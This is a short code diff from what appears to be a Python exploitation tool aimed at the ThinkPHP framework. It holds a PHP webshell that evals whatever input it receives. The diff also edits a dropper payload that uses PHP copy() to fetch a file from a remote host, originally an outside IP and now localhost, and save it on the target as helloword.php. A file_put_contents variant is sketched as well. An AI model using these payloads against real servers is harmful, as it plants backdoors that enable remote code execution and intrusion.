@@ -51,9 +51,9 @@ class ThinkPHP():
             class C{public function __invoke($p) {eval($p."");}}
             @call_user_func(new C(),$params);
         ?>'''
-        self.webshell_copy = '<?php copy("http://1.15.151.191/helloword.txt","helloword.php");?>'
+        self.webshell_copy = '<?php copy("http://127.0.0.1/helloword.txt","helloword.php");?>'
         '''
-        assert -> <?php copy("http://1.15.151.191/helloword.txt", "helloword.php");?>
+        assert -> <?php copy("http://127.0.0.1/helloword.txt", "helloword.php");?>
         file_put_contents -> vars[1][0]=helloword.php&vars[1][1]=helloword
         '''
         
